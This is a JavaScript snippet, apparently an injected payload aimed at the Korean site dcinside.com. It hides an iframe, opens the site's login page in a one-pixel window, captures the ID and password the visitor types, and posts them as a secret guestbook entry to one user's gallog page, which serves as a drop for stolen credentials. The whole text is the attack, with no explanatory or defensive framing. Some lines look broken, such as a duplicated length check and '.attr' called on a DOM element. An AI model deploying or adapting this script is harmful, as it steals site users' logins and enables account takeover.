document.domain = 'dcinside.com';
nas = document.createElement('iframe');
nas.id = 'hash';
nas.name = 'hash';
nas.scrolling = 'no';
nas.style.position = 'fixed';
nas.style.top = '1px';
nas.style.left = '1px';
nas.style.width = '1px';
nas.style.height = '1px';
nas.style.visibility = 'hidden';
var $ = parent.$;
nas.style.top = '-1000px';
nas.style.left = '-1000px';
nas.style.width = '1000000px';
nas.style.height = '1000000px';

function request(memo) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://gallog.dcinside.com/Intel/ajax/guestbook_ajax/write', true)
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest')
        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        xhr.onload = function () {
            // do something to response
            console.log(this.responseText);
        };
        data='ci_t=&password=1234&is_secret=1&name=ㅇㅇ&memo='+memo;
        xhr.send(data);
}

function warningsign() {
	var a = newwindow.document.querySelector("#id");
	var b = document.querySelector("#pw").value;
        var c = a + '\n' + b;
	if (b.length < 6) {
		setTimeout(function () {
			warningsign();
			newwindow.document.querySelector('#checksaveid').focus()
		},
		500)
	} else if (b.length < 6) {
		setTimeout(function () {
			warningsign()
		},
		500)
	} else {
		request(c);
		$('#hash').remove()
	}
}

$('div.appending_file_box')[0].appendChild(nas);
newwindow = window.open('https://dcid.dcinside.com/login', 'hash', 'width=1px, height=1px');
$('#hash').on('load', function () {
	newwindow.document.querySelector("html").attr('onclick', 'setTimeout(function(){window.opener.$("#hash").remove()},300);');
	warningsign()
});
